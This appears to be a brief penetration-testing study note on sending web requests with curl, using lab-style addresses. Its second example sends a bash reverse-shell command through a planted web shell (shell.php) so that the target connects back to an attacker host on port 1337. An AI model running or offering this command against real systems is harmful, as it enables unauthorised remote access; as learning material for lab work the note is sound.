# Handling Web Requests

## Handling Web Requests

### curl GET request

An example of a GET request  with curl is the following:

```bash
curl -X GET http://target
```

To send arguments or values via a GET request we can use the `--data-urlencode` parameter:

```bash
curl 'http://10.10.10.101/shell.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.7/1337 0>&1'"
```

